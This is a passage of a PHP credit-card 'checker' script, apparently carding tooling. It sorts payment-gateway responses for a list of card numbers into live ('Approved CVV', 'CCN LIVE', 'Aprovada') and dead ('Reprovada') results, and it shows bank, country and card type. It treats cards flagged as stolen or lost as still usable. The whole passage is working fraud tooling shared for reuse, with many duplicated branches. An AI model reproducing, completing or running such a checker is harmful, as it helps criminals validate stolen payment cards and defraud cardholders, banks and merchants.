  echo "<font size=2 color='black'>  <font class='badge badge-success'>Approved CVV ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED Incorrect zip </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  'Security code was not matched by the processor')) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  'The card verification number does not match')) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  'Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "incorrect_cvc")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "stolen_card")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen_Card</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "lost_card")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>lost_card</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  'Insufficient Funds')) {
  echo "<font size=2 color='black'>  <font class='badge badge-success'>Approved CVV ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Insufficient Funds</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "pickup_card")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card_Card</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "insufficient_funds")) {
  echo "<font size=2 color='black'>  <font class='badge badge-success'>Approved CVV ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient_funds</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  '"cvc_check": "fail"')) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  'CVV2 Mismatch')) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  'Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "incorrect_cvc")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "stolen_card")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen_Card</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "lost_card")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>lost_card</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  'Your card has insufficient funds.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-success'>Approved CVV ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient funds</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "pickup_card")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card_Card</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "insufficient_funds")) {
  echo "<font size=2 color='black'>  <font class='badge badge-success'>Approved CVV ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient_funds</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  'Your card has expired.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($curl,  'card number')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "RISK_DISALLOWED")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Risk Disallowed</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result,  'Card Declined')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Declined</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "Unable to authorize card. No response from Stripe.js.")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic_Decline</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "Something went wrong")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Something went wrong</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "Do Not Honor")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result,  "expired_card")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "processing_error")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>processing_error</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result, "service_not_allowed")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  'security code is incorrect.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>Aprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "lock_timeout")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process : Card Not Checked</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "transaction_not_allowed")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support Purchase</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result, "three_d_secure_redirect")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  'Card is declined by your bank, please contact them for additional information.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result, "missing_payment_information")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  'Your card has expired.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  'card number is incorrect.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "incorrect_number")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result,  'card was declined.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Declined</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "generic_decline")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic_Decline</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "do_not_honor")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result,  "expired_card")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "processing_error")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>processing_error</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result, "service_not_allowed")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result,  "parameter_invalid_empty")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Declined : Missing Card Details</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "lock_timeout")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process : Card Not Checked</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result,  "transaction_not_allowed")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support Purchase</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result,  'Card is declined by your bank, please contact them for additional information.')) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result, "missing_payment_information")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result, "threshold")) {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Risk Threshold</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

else {
  echo "<font size=2 color='black'>  <font class='badge badge-danger'> Reprovada ⍋ $lista </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Reason -> $message</i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}
echo "<span class='badge badge-pink'>Dabilol</span><br><br>"; 

curl_close($ch);
ob_flush();

//                                                                     Share With Credits

?>